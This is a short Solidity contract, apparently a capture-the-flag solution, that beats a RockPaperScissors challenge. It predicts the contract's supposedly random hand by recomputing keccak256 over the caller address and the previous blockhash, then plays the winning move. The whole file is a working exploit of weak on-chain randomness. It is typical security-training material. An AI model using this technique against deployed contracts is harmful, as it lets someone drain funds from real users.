// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "src/Challenge.sol";

contract Exploit {
    Challenge immutable challenge;

    constructor(Challenge chal) payable {
        challenge = Challenge(chal);
    }

    function exploit() external {
        RockPaperScissors rps = challenge.rps();

        // Recreate the randomShape logic
        RockPaperScissors.Hand challengeHand =
            RockPaperScissors.Hand(uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number - 1)))) % 3);

        // Choose winning hand
        RockPaperScissors.Hand winningHand;
        if (challengeHand == RockPaperScissors.Hand.Rock) {
            winningHand = RockPaperScissors.Hand.Paper;
        } else if (challengeHand == RockPaperScissors.Hand.Paper) {
            winningHand = RockPaperScissors.Hand.Scissors;
        } else {
            winningHand = RockPaperScissors.Hand.Rock;
        }

        // Call tryToBeatMe with our winning hand
        rps.tryToBeatMe(winningHand);
    }
}
